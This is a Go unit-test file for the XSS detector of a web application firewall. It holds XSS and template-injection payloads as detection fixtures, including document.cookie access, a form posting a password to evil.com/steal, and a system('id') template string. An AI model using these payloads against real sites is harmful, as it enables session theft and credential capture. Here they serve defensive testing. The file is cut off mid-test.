package xss

import (
	"net/http"
	"net/url"
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// --- Attack payloads that MUST be detected (score >= 50) ---

var attackPayloads = []struct {
	name     string
	input    string
	minScore int
}{
	{"script block", "<script>alert(1)</script>", 95},
	{"img onerror", "<img src=x onerror=alert(1)>", 85},
	{"svg onload", "<svg/onload=alert(1)>", 85},
	{"javascript protocol", "javascript:alert(1)", 80},
	{"iframe javascript", `<iframe src="javascript:alert(1)">`, 80},
	{"body onload", "<body onload=alert(1)>", 85},
	{"div style javascript", `<div style="background:url(javascript:alert(1))">`, 80},
	{"input onfocus", "<input onfocus=alert(1) autofocus>", 70},
	{"hex encoded script", "\\x3cscript\\x3ealert(1)", 90},
	{"mixed case script", "<ScRiPt>alert(1)</ScRiPt>", 95},
	{"meta refresh", `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1)">`, 50},
	{"template mustache", "{{constructor.constructor('alert(1)')()}}", 55},
	{"template es6", "${alert(1)}", 55},
	{"document cookie", "document.cookie", 60},
	{"dangerous js func", "eval('alert(1)')", 65},
}

// --- Benign inputs that must NOT trigger high scores (score < 25) ---

var benignInputs = []struct {
	name     string
	input    string
	maxScore int
}{
	{"p tag", "<p>Hello World</p>", 24},
	{"bold tag", "This is a <b>bold</b> statement", 24},
	{"dollar amount", "The price is $100", 0},
	{"getElementById", "Use document.getElementById()", 24},
	{"heart emoji text", "I love <3 puppies", 0},
	{"plain text", "Click here for details", 0},
	{"comparison operators", "a > b && c < d", 0},
	{"mustache variable", "{{ username }}", 0},
	{"shell variable docs", "${HOME}", 0},
	{"template placeholders", "{{a}} and ${b}", 0},
}

func TestDetect_AttackPayloads(t *testing.T) {
	for _, tt := range attackPayloads {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < minimum %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_BenignInputs(t *testing.T) {
	for _, tt := range benignInputs {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore > tt.maxScore {
				t.Errorf("input=%q: total score %d > maximum %d\nfindings: %+v",
					tt.input, totalScore, tt.maxScore, findings)
			}
		})
	}
}

func TestDetect_EmptyInput(t *testing.T) {
	findings := Detect("", "query")
	if findings != nil {
		t.Errorf("expected nil findings for empty input, got %v", findings)
	}
}

func TestDetect_ScriptVariants(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"basic script", "<script>alert(1)</script>", 95},
		{"script with attributes", `<script type="text/javascript">alert(1)</script>`, 95},
		{"script tag only", "<script src=evil.js>", 90},
		{"mixed case", "<ScRiPt>alert(1)</ScRiPt>", 95},
		{"uppercase", "<SCRIPT>alert(1)</SCRIPT>", 95},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d", tt.input, totalScore, tt.minScore)
			}
		})
	}
}

func TestDetect_EventHandlers(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"img onerror", "<img src=x onerror=alert(1)>", 85},
		{"body onload", "<body onload=alert(1)>", 85},
		{"div onmouseover", "<div onmouseover=alert(1)>", 85},
		{"svg onload", "<svg onload=alert(1)>", 85},
		{"input onfocus", "<input onfocus=alert(1) autofocus>", 70},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_JavaScriptProtocol(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"plain", "javascript:alert(1)", 80},
		{"iframe", `<iframe src="javascript:alert(1)">`, 80},
		{"anchor", `<a href="javascript:void(0)">click</a>`, 80},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_TemplateInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"mustache", "{{constructor.constructor('alert(1)')()}}", 55},
		{"es6 template", "${alert(1)}", 55},
		{"ruby/pug", "#{alert(1)}", 55},
		{"angular", "{{7*7}}", 55},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_EncodedPayloads(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"hex escape script", "\\x3cscript\\x3ealert(1)", 90},
		{"url encoded", "%3cscript%3ealert(1)", 90},
		{"html entity decimal", "&#60;script&#62;alert(1)", 20},
		{"unicode escape", "\\u003cscript\\u003e", 20},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_DOMManipulation(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"document.cookie", "document.cookie", 60},
		{"document.write", "document.write('<h1>XSS</h1>')", 55},
		{"innerHTML", "element.innerHTML = payload", 50},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_DangerousTags(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{"iframe", "<iframe src=evil.html>", 50},
		{"object", "<object data=evil.swf>", 45},
		{"embed", "<embed src=evil.swf>", 45},
		{"form with action", `<form action="http://evil.com/steal">`, 40},
		{"meta refresh", `<meta http-equiv="refresh" content="0;url=http://evil.com">`, 50},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_CSSExpression(t *testing.T) {
	findings := Detect(`<div style="width:expression(alert(1))">`, "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 70 {
		t.Errorf("CSS expression: total score %d < 70\nfindings: %+v", totalScore, findings)
	}
}

func TestDetect_FindingFields(t *testing.T) {
	findings := Detect("<script>alert(1)</script>", "query")
	if len(findings) == 0 {
		t.Fatal("expected at least one finding")
	}

	for _, f := range findings {
		if f.DetectorName != "xss" {
			t.Errorf("DetectorName: expected 'xss', got %q", f.DetectorName)
		}
		if f.Category != "xss" {
			t.Errorf("Category: expected 'xss', got %q", f.Category)
		}
		if f.Location != "query" {
			t.Errorf("Location: expected 'query', got %q", f.Location)
		}
		if f.Score <= 0 {
			t.Errorf("Score should be > 0, got %d", f.Score)
		}
		if f.Description == "" {
			t.Error("Description should not be empty")
		}
		if f.Confidence <= 0 || f.Confidence > 1.0 {
			t.Errorf("Confidence should be in (0, 1.0], got %f", f.Confidence)
		}
		if len(f.MatchedValue) > 200 {
			t.Errorf("MatchedValue should be truncated to 200 chars, got %d", len(f.MatchedValue))
		}
	}
}

// --- Detector Integration Tests ---

func TestDetector_Interface(t *testing.T) {
	det := NewDetector(true, 1.0)

	// Verify interface compliance
	var _ engine.Detector = det

	if det.Name() != "xss-detector" {
		t.Errorf("expected name 'xss-detector', got %q", det.Name())
	}
	if det.DetectorName() != "xss" {
		t.Errorf("expected detector name 'xss', got %q", det.DetectorName())
	}
	if len(det.Patterns()) == 0 {
		t.Error("expected non-empty patterns list")
	}
}

func TestDetector_Process(t *testing.T) {
	det := NewDetector(true, 1.0)

	reqURL, _ := url.Parse("http://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E")
	req := &http.Request{
		Method: "GET",
		URL:    reqURL,
		Header: http.Header{},
	}

	ctx := &engine.RequestContext{
		Request:        req,
		Method:         "GET",
		NormalizedPath: "/search",
		NormalizedQuery: map[string][]string{
			"q": {"<script>alert(1)</script>"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionLog {
		t.Errorf("expected ActionLog, got %v", result.Action)
	}
	if result.Score < 95 {
		t.Errorf("expected score >= 95, got %d", result.Score)
	}
	if len(result.Findings) == 0 {
		t.Error("expected findings for XSS payload")
	}

	for _, f := range result.Findings {
		if f.DetectorName != "xss" {
			t.Errorf("expected detector name 'xss', got %q", f.DetectorName)
		}
		if f.Category != "xss" {
			t.Errorf("expected category 'xss', got %q", f.Category)
		}
		if f.Location == "" {
			t.Error("expected non-empty location")
		}
	}
}

func TestDetector_Disabled(t *testing.T) {
	det := NewDetector(false, 1.0)

	ctx := &engine.RequestContext{
		NormalizedPath: "<script>alert(1)</script>",
		NormalizedQuery: map[string][]string{
			"q": {"<img src=x onerror=alert(1)>"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("disabled detector should return ActionPass, got %v", result.Action)
	}
	if len(result.Findings) != 0 {
		t.Errorf("disabled detector should produce no findings, got %d", len(result.Findings))
	}
	if result.Score != 0 {
		t.Errorf("disabled detector should have score 0, got %d", result.Score)
	}
}

func TestDetector_Multiplier(t *testing.T) {
	input := "<script>alert(1)</script>"

	// Baseline at 1.0
	det1 := NewDetector(true, 1.0)
	ctx1 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{
			"q": {input},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}
	result1 := det1.Process(ctx1)

	// At 2.0
	det2 := NewDetector(true, 2.0)
	ctx2 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{
			"q": {input},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}
	result2 := det2.Process(ctx2)

	if result1.Score == 0 {
		t.Fatal("baseline score should not be 0")
	}

	expectedMin := result1.Score*2 - len(result1.Findings)
	if result2.Score < expectedMin {
		t.Errorf("2x multiplier: expected score >= %d, got %d (baseline=%d)",
			expectedMin, result2.Score, result1.Score)
	}

	// At 0.5x
	det05 := NewDetector(true, 0.5)
	ctx05 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{
			"q": {input},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}
	result05 := det05.Process(ctx05)

	if result05.Score >= result1.Score {
		t.Errorf("0.5x multiplier score %d should be less than 1.0x score %d",
			result05.Score, result1.Score)
	}
}

func TestDetector_ScanLocations(t *testing.T) {
	det := NewDetector(true, 1.0)
	payload := "<script>alert(1)</script>"

	// Body
	ctx := &engine.RequestContext{
		NormalizedBody:  payload,
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result := det.Process(ctx)
	if result.Score < 95 {
		t.Errorf("body scan: expected score >= 95, got %d", result.Score)
	}
	hasBody := false
	for _, f := range result.Findings {
		if f.Location == "body" {
			hasBody = true
		}
	}
	if !hasBody {
		t.Error("expected findings with location 'body'")
	}

	// Cookie
	ctx2 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies: map[string]string{
			"session": payload,
		},
	}
	result2 := det.Process(ctx2)
	if result2.Score < 95 {
		t.Errorf("cookie scan: expected score >= 95, got %d", result2.Score)
	}

	// Referer header
	ctx3 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{},
		Headers: map[string][]string{
			"Referer": {payload},
		},
		Cookies: map[string]string{},
	}
	result3 := det.Process(ctx3)
	if result3.Score < 95 {
		t.Errorf("referer scan: expected score >= 95, got %d", result3.Score)
	}

	// User-Agent (scores halved)
	ctx4 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{},
		Headers: map[string][]string{
			"User-Agent": {payload},
		},
		Cookies: map[string]string{},
	}
	result4 := det.Process(ctx4)
	if result4.Score >= result.Score {
		t.Errorf("User-Agent scan score %d should be less than direct scan score %d (due to 0.5x)",
			result4.Score, result.Score)
	}
}

func TestDetect_CaseInsensitivity(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{"lowercase", "<script>alert(1)</script>"},
		{"uppercase", "<SCRIPT>alert(1)</SCRIPT>"},
		{"mixed case", "<ScRiPt>alert(1)</ScRiPt>"},
		{"random case", "<sCrIpT>alert(1)</sCrIpT>"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < 95 {
				t.Errorf("input=%q: total score %d < 95 (case insensitive detection failed)\nfindings: %+v",
					tt.input, totalScore, findings)
			}
		})
	}
}

// --- Parser unit tests ---

func TestScanTags_Basic(t *testing.T) {
	tags := scanTags("<img src=x onerror=alert(1)>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if tags[0].Name != "img" {
		t.Errorf("expected tag name 'img', got %q", tags[0].Name)
	}
	if _, ok := tags[0].Attributes["onerror"]; !ok {
		t.Error("expected 'onerror' attribute")
	}
}

func TestScanTags_QuotedAttributes(t *testing.T) {
	tags := scanTags(`<meta http-equiv="refresh" content="0;url=http://evil.com">`)
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if tags[0].Name != "meta" {
		t.Errorf("expected tag name 'meta', got %q", tags[0].Name)
	}
	if v, ok := tags[0].Attributes["http-equiv"]; !ok || v != "refresh" {
		t.Errorf("expected http-equiv=refresh, got %q", v)
	}
}

func TestScanTags_NullBytes(t *testing.T) {
	// Null bytes between tag characters should be stripped
	input := "<scr\x00ipt>alert(1)</script>"
	cleaned := removeNullBytes(input)
	lower := strings.ToLower(cleaned)
	if !strings.Contains(lower, "<script") {
		t.Error("null byte removal should expose <script tag")
	}
}

func TestHasEventHandler(t *testing.T) {
	attrs := map[string]string{
		"src":     "x",
		"onerror": "alert(1)",
	}
	name, ok := hasEventHandler(attrs)
	if !ok {
		t.Error("expected event handler to be found")
	}
	if name != "onerror" {
		t.Errorf("expected 'onerror', got %q", name)
	}

	// No event handler
	attrs2 := map[string]string{
		"src": "image.png",
		"alt": "photo",
	}
	_, ok = hasEventHandler(attrs2)
	if ok {
		t.Error("expected no event handler")
	}
}

func TestDetectTemplateInjection(t *testing.T) {
	tests := []struct {
		input string
		count int
	}{
		{"{{constructor}}", 1},
		{"${alert(1)}", 1},
		{"#{alert(1)}", 1},
		{"{{7*7}} and ${alert(1)}", 2},
		{"{{a}} and ${b}", 0},
		{"normal text", 0},
	}

	for _, tt := range tests {
		found := detectTemplateInjection(tt.input)
		if len(found) != tt.count {
			t.Errorf("input=%q: expected %d template markers, got %d: %v",
				tt.input, tt.count, len(found), found)
		}
	}
}

func TestDetectEncodedLT(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		{"\\x3cscript\\x3e", true},
		{"%3cscript%3e", true},
		{"&#60;script&#62;", true},
		{"\\u003cscript", true},
		{"<script>", false},
		{"normal text", false},
	}

	for _, tt := range tests {
		got := detectEncodedLT(tt.input)
		if got != tt.expected {
			t.Errorf("input=%q: expected %v, got %v", tt.input, tt.expected, got)
		}
	}
}

func TestRemoveNullBytes(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "hello"},
		{"hel\x00lo", "hello"},
		{"\x00\x00\x00", ""},
		{"<scr\x00ipt>", "<script>"},
	}

	for _, tt := range tests {
		got := removeNullBytes(tt.input)
		if got != tt.expected {
			t.Errorf("input=%q: expected %q, got %q", tt.input, tt.expected, got)
		}
	}
}

// --- Benchmarks ---

func BenchmarkDetect(b *testing.B) {
	input := "<script>alert(1)</script>"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Detect(input, "query")
	}
}

func BenchmarkDetect_Complex(b *testing.B) {
	input := `<img src=x onerror="javascript:document.cookie">`
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Detect(input, "query")
	}
}

// --- Additional Coverage Tests ---

func TestDetect_SVGWithOnload(t *testing.T) {
	findings := Detect("<svg/onload=alert(1)>", "query")
	hasSVG := false
	for _, f := range findings {
		if strings.Contains(f.Description, "SVG vector") {
			hasSVG = true
		}
	}
	if !hasSVG {
		t.Error("expected SVG vector finding")
	}
}

func TestDetect_SVGOnloadPlusAlert(t *testing.T) {
	findings := Detect(`<svg onload="alert(document.cookie)">`, "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 85 {
		t.Errorf("expected score >= 85 for SVG onload, got %d", totalScore)
	}
}

func TestDetect_CSSExpressionStandalone(t *testing.T) {
	findings := Detect("expression(alert(1))", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 70 {
		t.Errorf("expected score >= 70 for CSS expression, got %d", totalScore)
	}
}

func TestDetect_EncodedAngleBracketsAlone(t *testing.T) {
	// Only encoded bracket, no other XSS pattern
	findings := Detect("%3c", "query")
	hasEncoded := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Encoded angle bracket") {
			hasEncoded = true
		}
	}
	if !hasEncoded {
		t.Error("expected encoded angle bracket finding")
	}
}

func TestDetect_EncodedHTMLEntity(t *testing.T) {
	findings := Detect("&#x3c;script&#x3e;alert(1)", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 20 {
		t.Errorf("expected score >= 20 for HTML entity encoded, got %d", totalScore)
	}
}

func TestDetect_DataURITextHTML(t *testing.T) {
	findings := Detect("data:text/html,<script>alert(1)</script>", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 75 {
		t.Errorf("expected score >= 75 for data:text/html, got %d", totalScore)
	}
}

func TestDetect_DataURIInAttribute(t *testing.T) {
	findings := Detect(`<iframe src="data:text/html,<script>alert(1)</script>">`, "query")
	hasDataURI := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Data URI") {
			hasDataURI = true
		}
	}
	if !hasDataURI {
		t.Error("expected data URI finding in attribute")
	}
}

func TestDetect_DocumentWriteWithContent(t *testing.T) {
	// Note: this is a WAF test detecting attack patterns in user input
	findings := Detect("document.write('<h1>XSS</h1>')", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 55 {
		t.Errorf("expected score >= 55 for document.write, got %d", totalScore)
	}
}

func TestDetect_InnerHTMLAssignment(t *testing.T) {
	findings := Detect("element.innerHTML = payload", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for innerHTML, got %d", totalScore)
	}
}

func TestDetect_TemplateInjectionRuby(t *testing.T) {
	findings := Detect("#{system('id')}", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 55 {
		t.Errorf("expected score >= 55 for Ruby template injection, got %d", totalScore)
	}
}

func TestDetect_TemplateInjectionMultiple(t *testing.T) {
	findings := Detect("{{7*7}} ${alert(1)} #{system('id')}", "query")
	templateCount := 0
	for _, f := range findings {
		if strings.Contains(f.Description, "Template injection") {
			templateCount++
		}
	}
	if templateCount != 3 {
		t.Errorf("expected 3 template injection findings, got %d", templateCount)
	}
}

func TestDetect_ObjectTag(t *testing.T) {
	findings := Detect("<object data=evil.swf type=application/x-shockwave-flash>", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 45 {
		t.Errorf("expected score >= 45 for object tag, got %d", totalScore)
	}
}

func TestDetect_EmbedTag(t *testing.T) {
	findings := Detect("<embed src=evil.swf>", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 45 {
		t.Errorf("expected score >= 45 for embed tag, got %d", totalScore)
	}
}

func TestDetect_FormWithAction(t *testing.T) {
	findings := Detect(`<form action="http://evil.com/steal"><input name="password"></form>`, "query")
	hasForm := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Form tag with action") {
			hasForm = true
		}
	}
	if !hasForm {
		t.Error("expected form with action finding")
	}
}

func TestDetect_FormWithoutAction(t *testing.T) {
	findings := Detect(`<form method="post"><input name="q"></form>`, "query")
	hasFormAction := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Form tag with action") {
			hasFormAction = true
		}
	}
	if hasFormAction {
		t.Error("form without action should not trigger action finding")
	}
}

func TestDetect_MetaRefresh(t *testing.T) {
	findings := Detect(`<meta http-equiv="refresh" content="0;url=http://evil.com">`, "query")
	hasRefresh := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Meta refresh") {
			hasRefresh = true
		}
	}
	if !hasRefresh {
		t.Error("expected meta refresh finding")
	}
}

func TestDetect_MetaNonRefresh(t *testing.T) {
	findings := Detect(`<meta http-equiv="Content-Type" content="text/html">`, "query")
	hasRefresh := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Meta refresh") {
			hasRefresh = true
		}
	}
	if hasRefresh {
		t.Error("non-refresh meta should not trigger refresh finding")
	}
}

func TestDetect_JavaScriptInAttribute(t *testing.T) {
	findings := Detect(`<a href="javascript:alert(1)">click</a>`, "query")
	hasJS := false
	for _, f := range findings {
		if strings.Contains(f.Description, "JavaScript protocol") {
			hasJS = true
		}
	}
	if !hasJS {
		t.Error("expected JavaScript protocol finding in attribute")
	}
}

func TestDetect_LongPayloadTruncation(t *testing.T) {
	// Create a very long XSS payload
	longPayload := "<script>"
	for range 300 {
		longPayload += "a"
	}
	longPayload += "</script>"

	findings := Detect(longPayload, "query")
	for _, f := range findings {
		if len(f.MatchedValue) > 200 {
			t.Errorf("MatchedValue should be truncated, got length %d", len(f.MatchedValue))
		}
	}
}

func TestDetect_MakeFindingTruncation(t *testing.T) {
	longStr := ""
	for range 250 {
		longStr += "x"
	}
	f := makeFinding(50, engine.SeverityHigh, "test", longStr, "query", 0.5)
	if len(f.MatchedValue) > 200 {
		t.Errorf("expected truncated match, got length %d", len(f.MatchedValue))
	}
	if !strings.HasSuffix(f.MatchedValue, "...") {
		t.Error("expected truncated value to end with ...")
	}
}

func TestDetect_TruncateMatch(t *testing.T) {
	short := "short"
	if truncateMatch(short) != short {
		t.Errorf("short string should not be truncated")
	}

	longStr := ""
	for range 250 {
		longStr += "x"
	}
	result := truncateMatch(longStr)
	if len(result) != 200 {
		t.Errorf("expected 200 chars, got %d", len(result))
	}
}

func TestDetect_StandaloneEventHandler(t *testing.T) {
	// Event handler outside of HTML tag context
	findings := Detect("onclick=alert(1)", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 70 {
		t.Errorf("expected score >= 70 for standalone event handler, got %d", totalScore)
	}
}

func TestDetect_EventHandlerDoesNotMatchInsideLogKey(t *testing.T) {
	findings := Detect(`level=info component=docs msg="curl command disabled in dry-run mode"`, "body")
	for _, finding := range findings {
		if strings.Contains(finding.Description, "Inline event handler") {
			t.Fatalf("component= log key was treated as inline event handler: %+v", findings)
		}
	}
}

func TestDetect_DivOnmouseover(t *testing.T) {
	findings := Detect("<div onmouseover=alert(1)>", "query")
	hasDivEvt := false
	for _, f := range findings {
		if strings.Contains(f.Description, "Dangerous tag with event handler") && strings.Contains(f.Description, "div") {
			hasDivEvt = true
		}
	}
	if !hasDivEvt {
		t.Error("expected div event handler finding")
	}
}

func TestDetector_ProcessWithFallbackPath(t *testing.T) {
	det := NewDetector(true, 1.0)

	// Test with empty NormalizedPath, should fall back to Path
	ctx := &engine.RequestContext{
		Path:            "<script>alert(1)</script>",
		NormalizedPath:  "",
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}

	result := det.Process(ctx)
	if result.Score < 95 {
		t.Errorf("expected score >= 95 with fallback path, got %d", result.Score)
	}
}

func TestDetector_ProcessWithFallbackQuery(t *testing.T) {
	det := NewDetector(true, 1.0)

	// Test with nil NormalizedQuery, should fall back to QueryParams
	ctx := &engine.RequestContext{
		NormalizedPath:  "/search",
		NormalizedQuery: nil,
		QueryParams: url.Values{
			"q": {"<script>alert(1)</script>"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)
	if result.Score < 95 {
		t.Errorf("expected score >= 95 with fallback query, got %d", result.Score)
	}
}

func TestDetector_ProcessWithFallbackBody(t *testing.T) {
	det := NewDetector(true, 1.0)

	// Test with empty NormalizedBody, should fall back to BodyString
	ctx := &engine.RequestContext{
		NormalizedPath:  "/api",
		NormalizedBody:  "",
		BodyString:      "<script>alert(1)</script>",
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}

	result := det.Process(ctx)
	if result.Score < 95 {
		t.Errorf("expected score >= 95 with fallback body, got %d", result.Score)
	}
}

func TestScanTags_ClosingTag(t *testing.T) {
	tags := scanTags("</script>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag for closing tag")
	}
	if tags[0].Name != "script" {
		t.Errorf("expected tag name 'script', got %q", tags[0].Name)
	}
}

func TestScanTags_SelfClosing(t *testing.T) {
	tags := scanTags("<br/>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if tags[0].Name != "br" {
		t.Errorf("expected tag name 'br', got %q", tags[0].Name)
	}
}

func TestScanTags_MultipleTags(t *testing.T) {
	tags := scanTags("<div><span>text</span></div>")
	if len(tags) < 3 {
		t.Errorf("expected at least 3 tags, got %d", len(tags))
	}
}

func TestScanTags_UnquotedAttribute(t *testing.T) {
	tags := scanTags("<img src=x onerror=alert(1)>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if v, ok := tags[0].Attributes["onerror"]; !ok {
		t.Error("expected onerror attribute")
	} else if v != "alert(1)" {
		t.Errorf("expected onerror=alert(1), got %q", v)
	}
}

func TestScanTags_SingleQuotedAttribute(t *testing.T) {
	tags := scanTags("<img src='image.png' alt='photo'>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if v, ok := tags[0].Attributes["src"]; !ok || v != "image.png" {
		t.Errorf("expected src=image.png, got %q", v)
	}
}

func TestScanTags_EmptyInput(t *testing.T) {
	tags := scanTags("")
	if len(tags) != 0 {
		t.Errorf("expected 0 tags for empty input, got %d", len(tags))
	}
}

func TestScanTags_NoTags(t *testing.T) {
	tags := scanTags("just plain text without any tags")
	if len(tags) != 0 {
		t.Errorf("expected 0 tags, got %d", len(tags))
	}
}

func TestScanTags_MalformedTag(t *testing.T) {
	// Tag that starts but has no name
	tags := scanTags("< >text")
	// Should handle gracefully
	_ = tags
}

func TestDecodeCommonEncodings_JSHexEscape(t *testing.T) {
	result := decodeCommonEncodings("\\x3cscript\\x3e")
	if result != "<script>" {
		t.Errorf("expected '<script>', got %q", result)
	}
}

func TestDecodeCommonEncodings_JSUnicodeEscape(t *testing.T) {
	result := decodeCommonEncodings("\\u003cscript\\u003e")
	if result != "<script>" {
		t.Errorf("expected '<script>', got %q", result)
	}
}

func TestDecodeCommonEncodings_URLEncoding(t *testing.T) {
	result := decodeCommonEncodings("%3cscript%3e")
	if result != "<script>" {
		t.Errorf("expected '<script>', got %q", result)
	}
}

func TestDecodeCommonEncodings_HTMLDecimalEntity(t *testing.T) {
	result := decodeCommonEncodings("&#60;script&#62;")
	if result != "<script>" {
		t.Errorf("expected '<script>', got %q", result)
	}
}

func TestDecodeCommonEncodings_HTMLHexEntity(t *testing.T) {
	result := decodeCommonEncodings("&#x3c;script&#x3e;")
	if result != "<script>" {
		t.Errorf("expected '<script>', got %q", result)
	}
}

func TestDecodeCommonEncodings_HTMLDecimalNoSemicolon(t *testing.T) {
	result := decodeCommonEncodings("&#60script")
	if result != "<script" {
		t.Errorf("expected '<script', got %q", result)
	}
}

func TestDecodeCommonEncodings_HTMLHexNoSemicolon(t *testing.T) {
	result := decodeCommonEncodings("&#x3cscript")
	if result != "<script" {
		t.Errorf("expected '<script', got %q", result)
	}
}

func TestDecodeCommonEncodings_InvalidSequences(t *testing.T) {
	// Invalid hex escape
	result := decodeCommonEncodings("\\xZZ")
	if result != "\\xZZ" {
		t.Errorf("expected '\\xZZ' preserved, got %q", result)
	}

	// Invalid unicode escape
	result2 := decodeCommonEncodings("\\uZZZZ")
	if result2 != "\\uZZZZ" {
		t.Errorf("expected '\\uZZZZ' preserved, got %q", result2)
	}

	// Invalid URL encoding
	result3 := decodeCommonEncodings("%ZZ")
	if result3 != "%ZZ" {
		t.Errorf("expected '%%ZZ' preserved, got %q", result3)
	}
}

func TestDecodeCommonEncodings_PlainText(t *testing.T) {
	result := decodeCommonEncodings("hello world")
	if result != "hello world" {
